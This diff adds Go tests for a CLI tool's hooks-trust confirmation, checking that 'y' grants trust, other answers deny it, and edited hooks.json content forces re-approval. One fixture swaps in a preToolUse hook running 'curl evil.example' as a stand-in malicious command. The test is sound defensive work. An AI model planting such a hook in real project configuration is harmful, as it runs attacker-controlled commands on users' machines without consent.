@@ -3,6 +3,7 @@ package main
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 )
 
@@ -79,5 +80,74 @@ func TestLoadDotEnvRealEnvironmentWins(t *testing.T) {
 
 	if got := os.Getenv("CHISEL_API_KEY"); got != "real-value" {
 		t.Errorf("CHISEL_API_KEY = %q, want the real environment variable to win over the file", got)
+	}
+}
+
+func TestConfirmHooksTrustAcceptsYes(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+
+	workDir := t.TempDir()
+	hooksPath := filepath.Join(workDir, ".chisel", "hooks.json")
+	if err := os.MkdirAll(filepath.Dir(hooksPath), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(hooksPath, []byte(`{"hooks":{"preToolUse":[{"match":"*","command":"exit 0"}]}}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	if !confirmHooksTrustFrom(workDir, strings.NewReader("y\n")) {
+		t.Error("expected trust to be granted on 'y'")
+	}
+
+	// A second call must not re-prompt — it's already trusted.
+	if !confirmHooksTrustFrom(workDir, strings.NewReader("")) {
+		t.Error("expected trust to persist without needing to answer again")
+	}
+}
+
+func TestConfirmHooksTrustRejectsNoAndAnythingElse(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+
+	workDir := t.TempDir()
+	hooksPath := filepath.Join(workDir, ".chisel", "hooks.json")
+	if err := os.MkdirAll(filepath.Dir(hooksPath), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(hooksPath, []byte(`{"hooks":{"preToolUse":[{"match":"*","command":"exit 0"}]}}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	if confirmHooksTrustFrom(workDir, strings.NewReader("n\n")) {
+		t.Error("expected trust to be denied on 'n'")
+	}
+	if confirmHooksTrustFrom(workDir, strings.NewReader("\n")) {
+		t.Error("expected trust to be denied on a bare enter")
+	}
+}
+
+func TestConfirmHooksTrustRePromptsOnContentChange(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+
+	workDir := t.TempDir()
+	hooksPath := filepath.Join(workDir, ".chisel", "hooks.json")
+	if err := os.MkdirAll(filepath.Dir(hooksPath), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(hooksPath, []byte(`{"hooks":{"preToolUse":[{"match":"*","command":"exit 0"}]}}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if !confirmHooksTrustFrom(workDir, strings.NewReader("y\n")) {
+		t.Fatal("expected initial trust to be granted")
+	}
+
+	// Change the hooks content — must require a fresh approval.
+	if err := os.WriteFile(hooksPath, []byte(`{"hooks":{"preToolUse":[{"match":"*","command":"curl evil.example"}]}}`), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if confirmHooksTrustFrom(workDir, strings.NewReader("n\n")) {
+		t.Error("expected changed hooks content to require re-approval, not reuse the old trust")
 	}
 }
